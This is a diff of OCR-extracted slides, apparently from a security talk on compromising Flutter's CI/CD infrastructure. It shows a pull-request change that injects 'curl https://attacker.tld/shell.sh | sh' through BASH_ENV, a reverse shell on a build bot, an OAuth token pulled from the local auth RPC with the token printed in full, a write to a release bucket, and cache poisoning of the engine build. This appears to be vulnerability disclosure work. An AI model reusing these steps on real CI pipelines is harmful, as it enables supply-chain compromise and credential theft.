+To install the Flutter SDK, download the latest stored.
+
+1   Download the Flutter SDK bundle
+Download the following installation bundle
+
+flutter_windows_3.44.8-stable.zip
+
+2   Create a folder to store the SDK
+
+https://storage.googleapis.com/flutter_infra_release/releases/stable/windows_3.44.8-stable.zip
+
+Takeover What You Download!
 ```
 
 ## Slide 61
@@ -609,28 +963,43 @@ CI/CD
 
 ## Slide 62
 
+In Google OSS Infra
+
 CI/CD
 
 ## Slide 63
 
-Recipe (CI
-Steps)
-. 1. checkout
+Gerrit
+
+CV
+Change Verifier
+
 lucicfg / *.star
-2. compile
-Gerrit 3. test
-4. upload result
-Swarming
-CV schedule
+
 Buildbucket
-Change Verifier task
-Bot Bot Bot
+
+schedule task
+
+Recipe (CI Steps)
+1. checkout
+2. compile
+3. test
+4. upload result
+
+Swarming
+
+Bot   Bot   Bot
+
 CIPD
-Task workspace on Bot
 runtimes/tools
-Agent compile/test/…
+
+Task workspace on Bot
+
+Agent   compile/test/…
+
 CAS
 Build/task artifact
+
 Local Auth RPC
 
 ## Slide 64
@@ -641,101 +1010,149 @@ Job#3
 …
 secrets / token
 
-#### Job�Worker
+#### Job Worker
 
 ## Slide 65
 
-Job#1 Job#2 Job#3 … LUCI
+Job#1
+Job#2
+Job#3
+…
 
-secrets / token Layered Universal Continuous Integration Job�Worker
+LUCI
+Layered Universal Continuous Integration
+
+secrets / token
+
+Job Worker
 
 ## Slide 66
 
 ##### Google Cloud Platform
 
-Job#1 Job#2 Job#3 … Job#1 Prod Task Job#2 LUCI_CONTEXT Job#3 Based on task type … Bot Job�Worker Try Task
+Prod Task
+Job#1
+Job#2
+Job#3
+…
+
+Try Task
+Job#1
+Job#2
+Job#3
+…
+
+LUCI_CONTEXT
+Based on task type
+
+Bot
+Job Worker
 
 ## Slide 67
 
 ##### Google Cloud Platform
 
-Job#1
-Job#2
-Job#3
-…
-Job#1
 Prod Task
+Job#1
 Job#2
 Job#3
 …
-Bot
-Job�Worker
+
 Try Task
+Job#1
+Job#2
+Job#3
+…
 
 Local Auth RPC
-Auth Service Account
+Auth   Service Account
 LUCI_CONTEXT
 Based on task type
+
+Bot
+Job Worker
 
 ## Slide 68
 
-Job#1 Google Cloud Platform
-Job#2
-Job#3
-Local Auth RPC
-…
-Job#1 Auth Service Account
+##### Google Cloud Platform
+
 Prod Task
+Job#1
 Job#2
-LUCI_CONTEXT
 Job#3
-Based on task type
 …
-Bot
-Job�Worker
-Try Task
+
 Cross Task
+
+Try Task
+Job#1
+Job#2
+Job#3
+…
+
+Local Auth RPC
+Auth   Service Account
+LUCI_CONTEXT
+Based on task type
+
+Bot
+Job Worker
 
 ## Slide 69
 
-Job#1 Google Cloud Platform
+##### Google Cloud Platform
+
+Prod Task
+Job#1
 Job#2
 Job#3
-Local Auth RPC
 …
-Job#1 Auth Service Account
-Prod Task
-Job#2
-LUCI_CONTEXT
-(Something Job#3
-Based on task type
-Shared)
-…
-Bot
-Job�Worker
-Try Task
+
 Cross Task
+
+(Something Shared)
+
+Try Task
+Job#1
+Job#2
+Job#3
+…
+
+Local Auth RPC
+Auth   Service Account
+LUCI_CONTEXT
+Based on task type
+
+Bot
+Job Worker
 
 ## Slide 70
 
 ##### Google Cloud Platform
 
+Prod Task
 Job#1
 Job#2
 Job#3
 …
-Job#1
-Prod Task
-Job#2
-(Something Job#3
-Shared)
-…
-Bot
-Job�Worker
-Try Task
+
 Cross Task
 
-Local Auth RPC Auth Service Account LUCI_CONTEXT Based on task type
+(Something Shared)
+
+Try Task
+Job#1
+Job#2
+Job#3
+…
+
+Local Auth RPC
+Auth   Service Account
+LUCI_CONTEXT
+Based on task type
+
+Bot
+Job Worker
 
 ## Slide 71
 
@@ -743,298 +1160,600 @@ final content = await githubFileContent( slug, ciYamlPath, // ".ci.yaml" ref: co
 
 ## Slide 72
 
-- name: Linux framework_tests_libraries recipe: flutter/flutter_drone timeout: 60 properties: # ... tags: > final content = await githubFileContent( ["framework","hostonly","shard", "linux"] slug, **+    env_variables: >- +      {** ciYamlPath, // ".ci.yaml" **+        "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)** ref: commitSha, // <- fork's SHA: to attacker's file **+      }** ); **+    contexts: >- +      ["metric_center_token"]** runIf: - dev/** - packages/flutter/** # ...
+```yaml
+- name: Linux framework_tests_libraries
+  recipe: flutter/flutter_drone
+  timeout: 60
+  properties:
+    # ...
+    tags: >
+      ["framework","hostonly","shard", "linux"]
++   env_variables: >-
++     {
++       "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)"
++     }
++   contexts: >-
++     ["metric_center_token"]
+  runIf:
+    - dev/**
+    - packages/flutter/**
+  # ...
+```
+
+final content = await githubFileContent(
+    slug,
+    ciYamlPath,      // ".ci.yaml"
+    ref: commitSha,   // <- fork's SHA: to attacker's file
+);
 
 ## Slide 73
 
-- name: Linux framework_tests_libraries recipe: flutter/flutter_drone timeout: 60 properties: # ... tags: > final content = await githubFileContent( ["framework","hostonly","shard", "linux"] slug, **+    env_variables: >- +      {** ciYamlPath, // ".ci.yaml" **+        "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)** ref: commitSha, // <- fork's SHA: to attacker's file **+      }** ); Open PR! **+    contexts: >- +      ["metric_center_token"]** runIf: - dev/** - packages/flutter/** # ...
+```yaml
+- name: Linux framework_tests_libraries
+  recipe: flutter/flutter_drone
+  timeout: 60
+  properties:
+    # ...
+    tags: >
+      ["framework","hostonly","shard", "linux"]
++   env_variables: >-
++     {
++       "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)"
++     }
++   contexts: >-
++     ["metric_center_token"]
+  runIf:
+    - dev/**
+    - packages/flutter/**
+  # ...
+```
+
+final content = await githubFileContent(
+    slug,
+    ciYamlPath,      // ".ci.yaml"
+    ref: commitSha,   // <- fork's SHA: to attacker's file
+);
+
+Open PR!
 
 ## Slide 74
 
-- name: Linux framework_tests_libraries recipe: flutter/flutter_drone timeout: 60 properties: # ... tags: > final content = await githubFileContent( ["framework","hostonly","shard", "linux"] slug, **+    env_variables: >- +      {** ciYamlPath, // ".ci.yaml" **+        "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)** ref: commitSha, // <- fork's SHA: to attacker's file **+      }** ); Open PR! **+    contexts: >- +      ["metric_center_token"]** runIf: - dev/** - packages/flutter/** # ...
+```yaml
+- name: Linux framework_tests_libraries
+  recipe: flutter/flutter_drone
+  timeout: 60
+  properties:
+    # ...
+    tags: >
+      ["framework","hostonly","shard", "linux"]
++   env_variables: >-
++     {
++       "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)"
++     }
++   contexts: >-
++     ["metric_center_token"]
+  runIf:
+    - dev/**
+    - packages/flutter/**
+  # ...
+```
+
+final content = await githubFileContent(
+    slug,
+    ciYamlPath,      // ".ci.yaml"
+    ref: commitSha,   // <- fork's SHA: to attacker's file
+);
+
+How to avoid getting closed?
+
+Open PR!
 
 ## Slide 75
 
-- name: Linux framework_tests_libraries recipe: flutter/flutter_drone
+```text
+- name: Linux framework_tests_libraries
 
-timeout: 60 properties: # ... tags: > final content = await githubFileContent( ["framework","hostonly","shard", "linux"] slug, **+    env_variables: >- +      {** ciYamlPath, // ".ci.yaml" **+        "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)** ref: commitSha, // <- fork's SHA: to attacker's file **+      }** ); Open PR! **+    contexts: >- +      ["metric_center_token"]** runIf:
+512 Open   72,674 Closed                              Author   La
 
-- dev/** - packages/flutter/**
+[Impeller] Skip binding dead-code-eliminated resources on Metal   e: impeller   engine
+#190040 opened 43 minutes ago by bdero   Member · Draft   7 of 8 tasks
 
+Roll Skia from 62442d6cf0ec to c3b29df302dd (1 revision)   autosubmit   CICD   engi
+#190038 opened 1 hour ago by engine-flutter-autoroll   Contributor · Approved
+
+[Flutter GPU] Add 2D texture array support   CICD   e: impeller   engine   flutter-gpu   te
+#190036 opened 3 hours ago by bdero   Member · Review required   8 tasks done
+
+Roll Skia from 62442d6cf0ec to c3b29df302dd (1 revision)   CICD   engine
+#190033 by engine-flutter-autoroll   Contributor   was closed 1 hour ago · Approved
+
+Roll Skia from 62442d6cf0ec to c3b29df302dd (1 revision)   CICD   e
+#190032 by engine-flutter-autoroll   Contributor   was closed 5 hours ago · Approved
+
+f
+);
 # ...
+```
 
 ## Slide 76
 
-- name: Linux framework_tests_libraries recipe: flutter/flutter_drone
+```text
+- name: Linux framework_tests_libraries
 
-timeout: 60 properties: # ... tags: > final content = await githubFileContent( ["framework","hostonly","shard", "linux"] slug, **+    env_variables: >- +      {** ciYamlPath, // ".ci.yaml" **+        "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)** ref: commitSha, // <- fork's SHA: to attacker's file **+      }** ); Open PR! **+    contexts: >- +      ["metric_center_token"]** runIf: - dev/** - packages/flutter/**
+512 Open   72,674 Closed                              Author   La
 
+[Impeller] Skip binding dead-code-eliminated resources on Metal   e: impeller   engine
+#190040 opened 43 minutes ago by bdero   Member · Draft   7 of 8 tasks
+
+Roll Skia from 62442d6cf0ec to c3b29df302dd (1 revision)   autosubmit   CICD   engi
+#190038 opened 1 hour ago by engine-flutter-autoroll   Contributor · Approved
+
+[Flutter GPU] Add 2D texture array support   CICD   e: impeller   engine   flutter-gpu   te
+#190036 opened 3 hours ago by bdero   Member · Review required   8 tasks done
+
+Roll Skia from 62442d6cf0ec to c3b29df302dd (1 revision)   CICD   engine
+#190033 by engine-flutter-autoroll   Contributor   was closed 1 hour ago · Approved
+
+Roll Skia from 62442d6cf0ec to c3b29df302dd (1 revision)   CICD   e
+#190032 by engine-flutter-autoroll   Contributor   was closed 5 hours ago · Approved
+
+f
+);
 # ...
+```
 
 ## Slide 77
 
-
-> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-Roll Skia from f886711f9453 to fe9e9f229487 (4 revisions) #1
-eae CMe OEniltilps wants to merge 2 commits into flutter:master from @Eniltilps:patch-1 (QO)
-) Conversation 0 © Commits 2 —l Checks 151 Files changed 1
-OEniltilps commented on Mar 5
-Replace this paragraph with a description of what this PR is changing or adding, and why. Consider including before/after
-screenshots.
-List which issues are fixed by this PR. You must list at least one issue. An issue is n¢ PR fixes something
-trivial like a typo.
-If you had to change anything in the flutter/tests repo, include a link to the mig aking change
+Roll Skia from f886711f9453 to fe9e9f229487 (4 revisions) #18
+
+Closed   0Eniltilps wants to merge 2 commits into flutter:master from 0Eniltilps:patch-1
+
+Conversation 0   Commits 2   Checks 151   Files changed 1
+
+0Eniltilps commented on Mar 5
+
+Replace this paragraph with a description of what this PR is changing or adding, and why. Consider including before/after screenshots.
+
+List which issues are fixed by this PR. You must list at least one issue. An issue is not required if the PR fixes something trivial like a typo.
+
+If you had to change anything in the flutter/tests repo, include a link to the migration guide and breaking change policy.
 ```
 
 ## Slide 78
 
-final content = await githubFileContent( slug, ciYamlPath, // ".ci.yaml" ref: commitSha, // <- fork's SHA: to attacker's file
-
+final content = await githubFileContent(
+    slug,
+    ciYamlPath,      // ".ci.yaml"
+    ref: commitSha,   // <- fork's SHA: to attacker's file
 );
 
-
-> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-ee0e 8 rlwrap (ssh)
+rlwrap (ssh)
+
 id
+uid=1000(chrome-bot) gid=1000(chrome-bot) groups=1000(chrome-bot),109(kvm)
 ip addr
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
-inet 127.0.0.1/8 scope host lo
-valid_lft forever preferred_lft forever
-inet6 ::1/128 scope host
-valid_lft forever preferred_lft forever
-2: ens4: <BROADCAST ,MULTICAST,UP,LOWER_UP> mtu 146@ qdisc mq state UP group default qlen 1000
-inet 10.128.0.73/32 metric 10@ scope global dynamic ens4
-valid_lft 3264sec preferred_lft 3264sec
-inet6 fe8&@: :4001:aff:fe80:49/64 scope link
-valid_lft forever preferred_lft forever
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+2: ens4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1460 qdisc mq state UP group default qlen 1000
+    link/ether 42:01:0a:80:00:49 brd ff:ff:ff:ff:ff:ff
+    inet 10.128.0.73/32 metric 100 scope global dynamic ens4
+       valid_lft 3264sec preferred_lft 3264sec
+    inet6 fe80::4001:aff:fe80:49/64 scope link
+       valid_lft forever preferred_lft forever
 ps
-PID TTY TIME CMD
-1084 ? 00:00:14 python3
-73742 ? 00:00:00 systemd
-73744 ? 00:00:00 Csd-pam) R
-73750 ? @@:00:08 chromebuild-sta e€verse Shel]!
-74714 ? 00:08:04 python3 e
+    PID TTY          TIME CMD
+   1084 ?        00:00:14 python3
+  73742 ?        00:00:00 systemd
+  73744 ?        00:00:00 (sd-pam)
+  73750 ?        00:00:00 chromebuild-sta
+  74714 ?        00:00:04 python3
 ```
+
+Reverse Shell!
 
 ## Slide 79
 
-
-> Recovered by OCR — confidence 77/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-eee a (s} rlwrap (ssh) #2
+rlwrap (ssh)
+
 id
-uid=100@Cchrome-bot) gid=100@Cchrome-bot) groups=1000Cchrome-bot) ,109Ckvm)
+uid=1000(chrome-bot) gid=1000(chrome-bot) groups=1000(chrome-bot),109(kvm)
 curl -s -X POST \
--H "Content-Type: application/json" \
-\"scopes\": [
-\"https://www.googleapis.com/auth/cloud-platform\",
-\"secret\": \"ik/ORYUTeygi5+wB8g1/niL91PxVgQP84zDmt TUG726M7Nc fdzDMVeRGXXLVmSXU\" ,
-\"account_id\": \"task\"
-"http://127.0.0.1:39979/rpc/LuciLocalAuthService. GetOAuthToken"
+    -H "Content-Type: application/json" \
+    -d "{
+      \"scopes\": [
+        \"https://www.googleapis.com/auth/cloud-platform\",
+        \"https://www.googleapis.com/auth/datastore\"
+      ],
+      \"secret\": \"ik/ORYUTeygi5+wB8g1/niL91PxVgQP84zDmtTUG726M7NcfdzDMVeRGXXlVmSXU\",
+      \"account_id\": \"task\"
+    }" \
+    "http://127.0.0.1:39979/rpc/LuciLocalAuthService.GetOAuthToken"
+> > > > > > > > {"access_token": "ya29.c.c0AZ4bNpYTYqVltK7v0ptso3kZLMZHoLsm68xNM0Yg9pzhJAKvcgzYZ-HBJr2hMlv0f0cIK-uEre0yNjV3Tj-ONPLgKBhrpOn2aAixKeACzXpI6zA7VtrT70oek5FX14hGPw6FsIDXKIaVovPbQBOQJssbGeXL4ZxwtE2GPuglgPJw6ZY8LecV1vHqEOd6n81ew5XWi-F0Jg9I3pd2sYFnHRCben-NV8uaXbXgsZgIaNjqLew_JB4PCH4DUx_0Kpr1aFQWqFOkC5nHZsYWAK1MQ2CRoGJbNQ0S5KuKyE2_S2ON-daOQqJv7juTiSRny5RUqvo3P95bO4e07P6LXmjN_UVFrQyk_t2VZ7wrDG_IJmOZJhj0_IjZAsXGXkriaRVdmaVHL4nP33EhRWWtT_E9XPUHOcY46K855NH_OY7iwkmkjbyPM5phMJyAbT_n7U1WnLPQ0IcPcID_tRgU628gJLXuTrmlO8C9OKV4AW6VONKEaO0rDY1xwnxyI9OpZuGA4AmIiz66i2EthujjJUFys7f84079As2A1Rr5LkNApzmo_af7P-iazlXYk-W3fFrZlwbby37vJjSHMLnYNKDCFGDjQVl4GONyWCeQWiIkeSRsMn0bu6YgTgL639P_ye5lrkRwvt5qFz-Vvg-3Ss2Y6fh8wq_JBjFu1i7WJec2QUhUVlXfzfBVrnVoqZV0t17fsujQpm4jfkafZ1ZOymsj_decmoy0Zk-M3oSphUstfZy-q7nbe27Uedx11t1aZ2zz7YWs3zvk4l_koewY6fyZ-3fFayas1kqRSx4p27Il3VBpFB072fwFmt-aoxqd8Vjiq4fYs1O3RQ2UpWZ6vtY_sSqYfybq56JhzMjhxiRiI3u_mf6BWSrr91ytaY_1M4Z3Venzs5ffZcpghMvM653gjbsnZ7M9Sl_Fp_Jnele_J_oVcsw2rn-499wcd9_YkitmY7mVXMQ7tlWMOBnt-F_wbch1FjSqUf1OFmxsJR7QM3k4ovl6aogJju1", "expiry": 1772716104}
 ```
 
 ## Slide 80
 
-
-> Recovered by OCR — confidence 78/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-+ ~ curl -sS -X POST \
--H "Authorization: Bearer $TOKEN" \
--H "Content-Type: text/plain" \
---data 'pwned'" \
-"kind": "storage#object”,
-"id": "flutter_archives_v2/downLoad.flutter.io/io0/pwned.txt/1772713469572856",
-"selfLink": "https://www.googleapis.com/storage/v1/b/flutter_archives_v2/o/downLoc
+~ curl -sS -X POST \
+    -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: text/plain" \
+    --data 'pwned' \
+    "https://storage.googleapis.com/upload/storage/v1/b/flutter_archives_v2/o?uploadTy
+t"
+
+{
+  "kind": "storage#object",
+  "id": "flutter_archives_v2/download.flutter.io/io/pwned.txt/1772713469572856",
+  "selfLink": "https://www.googleapis.com/storage/v1/b/flutter_archives_v2/o/downloa
+  "mediaLink": "https://storage.googleapis.com/download/storage/v1/b/flutter_archive
 eneration=1772713469572856&alt=media",
-"generation": "1772713469572856",
-"“metageneration”: "1",
-"contentType": "text/plain",
-"size": "5",
-ou © 3/05, 8:27PM s
+  "name": "download.flutter.io/io/pwned.txt",
+  "bucket": "flutter_archives_v2",
+  "generation": "1772713469572856",
+  "metageneration": "1",
+  "contentType": "text/plain",
+  "storageClass": "STANDARD",
+  "size": "5",
 ```
 
 ## Slide 81
 
+```text
+https://www.googleapis.com/download/storage/v1/b/flutter_archives_v2/o/download.flutter.io%2Fio%2Fpwned.txt?alt
+
+pwned
+
 Write to gs://flutter_archives_v2
 
-
-> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-S G ~ https://www.googleapis.com/download/storage/v1/b/flutter_archives_v2/o/download.flutter.io%2Fio%2Fpwned.txt?
-pwned
-Write to gs://flutter_archives v2
 "storageClass": "STANDARD",
-"Size": "5",
-© 3/05, 8:27PM
+"size": "5",
 ```
 
 ## Slide 82
 
-# Pwned?
+Pwned?
+
+```text
+pwned
 
 Write to gs://flutter_archives_v2
 
-
-> Recovered by OCR — confidence 82/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-Write to gs://flutter_archives v2
 "storageClass": "STANDARD",
 "size": "5",
-© 3/05, 8:27PM a
 ```
 
 ## Slide 83
 
+```text
 - name: Linux framework_tests_libraries
 
-recipe: flutter/flutter_drone timeout: 60 properties: # ... final content tags: > = await githubFileContent( final content = await githubFileContent( slug,["framework","hostonly","shard", "linux"] slug, **+    env_variables: >-** Pwned? ciYamlPath, // ".ci.yaml" **+      {** ciYamlPath, // ".ci.yaml" ref: commitSha, // <- fork's SHA: to attacker's file **+        "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)** ref);: commitSha, // <- fork's SHA: to attacker's file **+      } +    contexts: >-** Write to gs://flutter_archives_v2 ); **+      ["metric_center_token"]** runIf:
+Install manually
+Install with VS Code
+SDK archive
+Upgrade SDK
+Add to path
+Troubleshoot
+Uninstall SDK
+Resources
 
-- dev/** - packages/flutter/** # ...
+Install and set up Flutter
+
+To install the Flutter SDK, download the latest stored.
+
+1   Download the Flutter SDK bundle
+Download the following installation bundle
+
+flutter_windows_3.44.8-stable.zip
+
+2   Create a folder to store the SDK
+
+https://storage.googleapis.com/flutter_infra_release/releases/stable/windows/flutter_windows_3.44.8-stable.zip
+
+t-aoxqd8Vjiq4fYs1O3RQ2UpWZ6vtY_sSqYfybq56JhzMjhxiRiI3u_mf6BWSrr91ytaY_1M4Z3Venzs5ffZcpghMvM653gj
+bsnZ7M9Sl_Fp_Jnele_J_oVcsw2rn-499wcd9_YkitmY7mVXMQ7tlWMOBnt-F_wbch1FjSqUf1OFmxsJR7QM3k4ovl6aogJj
+u1", "expiry": 1772716104}
+```
 
 ## Slide 84
 
-- name: Linux framework_tests_libraries recipe: flutter/flutter_drone timeout: 60 properties: # ... final content tags: > = await githubFileContent( final content = await githubFileContent( slug,["framework","hostonly","shard", "linux"] slug, **+    env_variables: >-** Pwned? ciYamlPath, // ".ci.yaml" **+      {** ciYamlPath, // ".ci.yaml" ref: commitSha, // <- fork's SHA: to attacker's file **+        "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)** ref);: commitSha, // <- fork's SHA: to attacker's file **+      } +    contexts: >-** Write to gs://flutter_archives_v2 ); **+      ["metric_center_token"]** **. gs://flutter_infra_release** runIf: - dev/** - packages/flutter/** # ...
+```text
+- name: Linux framework_tests_libraries
+
+Install manually
+Install with VS Code
+SDK archive
+Upgrade SDK
+Add to path
+Troubleshoot
+Uninstall SDK
+Resources
+
+Install and set up Flutter
+
+To install the Flutter SDK, download the latest stored.
+
+1   Download the Flutter SDK bundle
+Download the following installation bundle
+
+flutter_windows_3.44.8-stable.zip
+
+gs://flutter_infra_release
+
+2   Create a folder to store the SDK
+
+https://storage.googleapis.com/flutter_infra_release/releases/stable/windows/flutter_windows_3.44.8-stable.zip
+
+t-aoxqd8Vjiq4fYs1O3RQ2UpWZ6vtY_sSqYfybq56JhzMjhxiRiI3u_mf6BWSrr91ytaY_1M4Z3Venzs5ffZcpghMvM653gj
+bsnZ7M9Sl_Fp_Jnele_J_oVcsw2rn-499wcd9_YkitmY7mVXMQ7tlWMOBnt-F_wbch1FjSqUf1OFmxsJR7QM3k4ovl6aogJj
+u1", "expiry": 1772716104}
+```
 
 ## Slide 85
 
+Prod Task
 Job#1
 Job#2
-Local Auth RPC
 Job#3
 …
-Auth Service Account
-Job#1
-Prod Task
-Job#2 LUCI_CONTEXT
-Based on task type
-(Something
-Job#3
-Shared)
-…
-Bot
-Job�Worker
-Try Task
+
 Cross Task
+
+(Something Shared)
+
+Try Task
+Job#1
+Job#2
+Job#3
+…
+
+Local Auth RPC
+Auth   Service Account
+LUCI_CONTEXT
+Based on task type
+
+Bot
+Job Worker
 
 ## Slide 86
 
+Prod Task
 Job#1
 Job#2
-Local Auth RPC
 Job#3
 …
-Auth Service Account
-Job#1
-Prod Task
-Job#2 LUCI_CONTEXT
-Based on task type
-(Something
-Job#3
-Shared)
-…
-Bot
-Job�Worker
-Try Task
+
 Cross Task
+
+(Something Shared)
+
+Try Task
+Job#1
+Job#2
+Job#3
+…
+
+Local Auth RPC
+Auth   Service Account
+LUCI_CONTEXT
+Based on task type
+
+Bot
+Job Worker
 
 ## Slide 87
 
+Prod Task
 Job#1
 Job#2
-Local Auth RPC
 Job#3
 …
-Auth Service Account
-Job#1
-Prod Task
-Job#2 LUCI_CONTEXT
-Based on task type
-flutter_archives_v2 Job#3
-…
-Bot
-Job�Worker
-Try Task
+
 Cross Task
+
+flutter_archives_v2
+
+Try Task
+Job#1
+Job#2
+Job#3
+…
+
+Local Auth RPC
+Auth   Service Account
+LUCI_CONTEXT
+Based on task type
+
+Bot
+Job Worker
 
 ## Slide 88
 
+Prod Task
 Job#1
 Job#2
-Local Auth RPC
 Job#3
 …
-Auth Service Account
-Job#1
-Prod Task
-Job#2 LUCI_CONTEXT
-Based on task type
-flutter_archives_v2 Job#3
-…
-Bot
-Job�Worker
-Try Task
+
 Cross Task
+
+flutter_archives_v2
+
+Try Task
+Job#1
+Job#2
+Job#3
+…
+
+Local Auth RPC
+Auth   Service Account
+LUCI_CONTEXT
+Based on task type
+
+Bot
+Job Worker
 
 ## Slide 89
 
-Job#1 Job#2 Local Auth RPC Job#3 mount_cache('builder') … _cache_path('builder') Auth Service Account Job#1 Prod Task gs://flutter_archives_v2/caches/builder-linux.json hashes = {"builder": <digest>, Job#2 LUCI_CONTEXT "git": <digest>} Based on task type [CACHE]/builder ← Flutter Engine flutter_archives_v2 Job#3 [CACHE]/git … B ot Job�Worker Try Task git('checkout', '--force', pin or branch, '--', cwd=sln_dir)
+mount_cache('builder')
+_cache_path('builder')
+gs://flutter_archives_v2/caches/builder-linux.json
+hashes = {"builder": <digest>, "git": <digest>}
+[CACHE]/builder   ← Flutter Engine
+[CACHE]/git
+git('checkout', '--force', pin or branch, '--', cwd=sln_dir)
+
+Prod Task
+Job#1
+Job#2
+Job#3
+…
+
+Cross Task
+
+flutter_archives_v2
+
+Try Task
+Job#1
+Job#2
+Job#3
+…
+
+Local Auth RPC
+Auth   Service Account
+LUCI_CONTEXT
+Based on task type
+
+Bot
+Job Worker
 
 ## Slide 90
 
-Job#1 Job#2 Local Auth RPC Job#3 mount_cache('builder') … _cache_path('builder') Auth Service Account Job#1 Prod Task gs:// flutter_archives_v2/ caches/builder-linux.json hashes = {"builder": <digest>, Job#2 LUCI_CONTEXT "git": <digest>} Based on task type [CACHE]/builder ← Flutter Engine flutter_archives_v2 Job#3 [CACHE]/git … B ot Job�Worker Try Task git('checkout', '--force', pin or branch, '--', cwd=sln_dir)
+mount_cache('builder')
+_cache_path('builder')
+gs://flutter_archives_v2/caches/builder-linux.json
+hashes = {"builder": <digest>, "git": <digest>}
+[CACHE]/builder   ← Flutter Engine
+[CACHE]/git
+git('checkout', '--force', pin or branch, '--', cwd=sln_dir)
+
+Prod Task
+Job#1
+Job#2
+Job#3
+…
+
+Cross Task
+
+flutter_archives_v2
+
+Try Task
+Job#1
+Job#2
+Job#3
+…
+
+Local Auth RPC
+Auth   Service Account
+LUCI_CONTEXT
+Based on task type
+
+Bot
+Job Worker
 
 ## Slide 91
 
+mount_cache('builder')
+_cache_path('builder')
+gs://flutter_archives_v2/caches/builder-linux.json
+hashes = {"builder": <digest>, "git": <digest>}
+[CACHE]/builder   ← Flutter Engine
+[CACHE]/git
+git('checkout', '--force', pin or branch, '--', cwd=sln_dir)
+
+Prod Task
 Job#1
 Job#2
-Local Auth RPC
 Job#3
-mount_cache('builder')
-…  _cache_path('builder')
-Auth Service Account
-Job#1
-Prod Task gs:// flutter_archives_v2/ caches/builder-linux.json
-hashes = {"builder": <digest>,
-Job#2 LUCI_CONTEXT
-"git": <digest>}
-Based on task type
-[CACHE]/builder ← Flutter Engine
-flutter_archives_v2 Job#3
-[CACHE]/git
 …
-B ot
-Job�Worker
-Try Task
-git('checkout', '--force', pin or branch, '--', cwd=sln_dir)
+
 Cross Task
+
+flutter_archives_v2
+
+Try Task
+Job#1
+Job#2
+Job#3
+…
+
+Local Auth RPC
+Auth   Service Account
+LUCI_CONTEXT
+Based on task type
+
+Bot
+Job Worker
 
 ## Slide 92
 
-Job#1 Job#2 Local Auth RPC Job#3 mount_cache('builder') … _cache_path('builder') Auth Service Account Job#1 Prod Task gs:// flutter_archives_v2/ caches/builder-linux.json hashes = {"builder": <digest>, Job#2 LUCI_CONTEXT "git": <digest>} Based on task type [CACHE]/builder ← Flutter Engine flutter_archives_v2 Job#3 Compromised! [CACHE]/git … B ot Job�Worker Try Task **git('checkout', '--force', pin or branch, '--', cwd=sln_dir)**
+mount_cache('builder')
+_cache_path('builder')
+gs://flutter_archives_v2/caches/builder-linux.json
+
+Compromised!
+
+[CACHE]/builder   ← Flutter Engine
+
+git('checkout', '--force', pin or branch, '--', cwd=sln_dir)
+
+Prod Task
+Job#1
+Job#2
+Job#3
+…
+
+Cross Task
+
+flutter_archives_v2
+
+Try Task
+Job#1
+Job#2
+Job#3
+…
+
+Local Auth RPC
+Auth   Service Account
+LUCI_CONTEXT
+Based on task type
+
+Bot
+Job Worker
 
 ## Slide 93
 
 **Cocoon Flutter Build Dashboard**
 
-
-> Recovered by OCR — confidence 93/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
 Flutter Build Dashboard — Cocoon
+
+Build
 PreSubmit
 Manual Tree Status
 Framework Benchmarks
 Engine Benchmarks
 Source Code
-About Flutter Build Dashboard —
+About Flutter Build Dashboard — Cocoon
+
+...c mac_unopt, Linux web_ca...   repo: flutter   branch: master
+
 Cocoon
 Flutter Build Dashboard
 ```
@@ -1045,24 +1764,20 @@ if (email.endsWith( **'@google.com'** ) || await _isAllowedCached(token.email)) 
 
 ## Slide 95
 
-Future<TokenInfo> decodeAndVerify(String jwtString) async { final now = _now(); **final = await JsonWebToken. jwt decodeAndVerify(jwtString, keyStore); verifyJwtClaims(jwt.claims, now);** return TokenInfo.fromJson(jwt.claims.toJson());
+Future<TokenInfo> decodeAndVerify(String jwtString) async { final now = _now(); **final jwt = await JsonWebToken.decodeAndVerify(jwtString, keyStore); verifyJwtClaims(jwt.claims, now);** return TokenInfo.fromJson(jwt.claims.toJson());
 
 }
 
 ## Slide 96
 
-Future<TokenInfo> decodeAndVerify(String jwtString) async { final now = _now(); **final = await JsonWebToken. jwt decodeAndVerify(jwtString, keyStore); verifyJwtClaims(jwt.claims, now);** return TokenInfo.fromJson(jwt.claims.toJson());
+Future<TokenInfo> decodeAndVerify(String jwtString) async { final now = _now(); **final jwt = await JsonWebToken.decodeAndVerify(jwtString, keyStore); verifyJwtClaims(jwt.claims, now);** return TokenInfo.fromJson(jwt.claims.toJson());
 
 }
 
 ## Slide 97
 
-
-> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-eee «2 8 rlwrap (ssh) * ..-Sec/_reports (-zsh)
-+» _reports curl -s -H "X-Flutter-IdToken: " "https://flutter-dashboard.appspot.com/api/get-tree-status?repo=flutter" -i
